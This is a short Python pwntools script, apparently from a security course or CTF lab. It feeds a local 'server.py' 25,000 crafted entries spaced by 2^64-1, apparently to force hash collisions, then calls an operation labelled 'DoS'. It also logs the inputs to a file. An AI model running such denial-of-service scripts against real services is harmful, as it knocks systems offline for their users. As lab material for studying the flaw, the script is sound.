from pwn import *

def initialize(f, p):
	p.sendline('1')
	f.write('1\n')
	p.recv()
	p.sendline('DoS')
	f.write('DoS\n')
	p.recv()
	p.sendline('b07902127')
	f.write('b07902127\n')
	p.recv()
	p.sendline('abcd@e.f.g.hij')
	f.write('abcd@e.f.g.hij\n')
	p.recv()

		
def gendata(f, p, base, n):
	for i in range(25000):
		p.sendline('2')
		f.write('2\n')
		p.recv()
		p.sendline('0')
		f.write('0\n')
		p.recv()
		p.sendline(str(base + n * i))
		f.write(str(base + n * i) + '\n')
		p.recv()
		p.sendline('10')
		f.write('10\n')
		p.recv()

def DoS(f, p):
	p.sendline('4')
	f.write('4\n')
	p.recv()
	p.sendline('0')
	f.write('0\n')
	p.recv()

def main():
	base = 3
	n = 18446744073709551615
	f = open('input2.txt','w+')
	p = process('./server.py')
	#2^64 - 1 = 18446744073709551615
	initialize(f, p)
	gendata(f, p, base, n)
	DoS(f, p)

if __name__ == '__main__':
	main()

